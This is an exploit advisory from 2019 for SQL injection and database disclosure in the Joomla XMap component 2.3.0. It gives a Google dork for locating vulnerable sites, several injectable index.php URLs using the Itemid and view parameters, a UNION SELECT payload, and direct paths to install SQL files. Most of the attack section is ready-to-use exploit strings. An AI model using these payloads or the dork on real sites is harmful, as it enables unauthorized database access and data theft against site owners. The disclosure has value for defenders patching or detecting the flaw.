####################################################################

# Exploit Title : Joomla XMap Components 2.3.0 SQL Injection / Database Disclosure
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 30/01/2019
# Vendor Homepage : joomla.org
# Software Download Links : joomla4ever.org/archive/ext/com_xmap.zip
joomlacode.org/gf/project/xmap/frs/?action=FrsReleaseBrowse&frs_package_id=3882
rsjoomla.com/support/documentation/rsblog-/plugins-and-modules/xmap-plugin.html
# Software Information Link : joomla4ever.org/extensions/ext-xmap
# Software Versions : 1.2.7 / 2.3.0 and other versions
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Medium
# Google Dorks : inurl:''/index.php?option=com_xmap''
# Vulnerability Type : CWE-89 [ Improper Neutralization of 
Special Elements used in an SQL Command ('SQL Injection') ]
CWE-200 [ Information Exposure ]
# Similar but for old Version CVE : cvedetails.com/cve/CVE-2010-2678/ - CVE-2010-2678
Note : Keep in mind. This Exploit/Vuln has been told in more details.
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos
# Reference Link : cxsecurity.com/issue/WLB-2019010285

####################################################################

# Description about Software :
***************************

"XMAP" is open source software for Joomla.

####################################################################

# Impact :
***********
* SQL injection vulnerability in xmap (com_xmap) component for Joomla! 

allows remote attackers to execute arbitrary SQL commands via the Itemid parameter to index.php.	

* Successful exploitation will let attackers to manipulate SQL queries by injecting arbitrary SQL code.

* The flaw is due to input passed via 'view=' and 'Itemid=' parameter to 'index.php' 

is not properly sanitised before being used in a SQL query.

####################################################################

# SQL Injection Exploit :
**********************

/index.php?option=com_xmap&Itemid=[SQL Injection]

/index.php?option=com_xmap&sitemap=[ID-NUMBER]&Itemid=[SQL Injection]

/index.php?option=com_xmap&tmpl=component&Itemid=[ID-NUMBER]&view=[SQL Injection]

/index.php?option=com_xmap&view=html&id=[ID-NUMBER]&Itemid=[SQL Injection]

# Exploit Payload :
*****************

-1 UNION SELECT 1,2,3,version(),5,6,7,8--

####################################################################

# Database Disclosure Exploit :
****************************

/administrator/components/com_xmap/install/install.postgresql.sql

/administrator/components/com_xmap/install/install.utf8.sql

/administrator/components/com_xmap/install/uninstall.postgresql.sql

/administrator/components/com_xmap/install/uninstall.utf8.sql

####################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

####################################################################
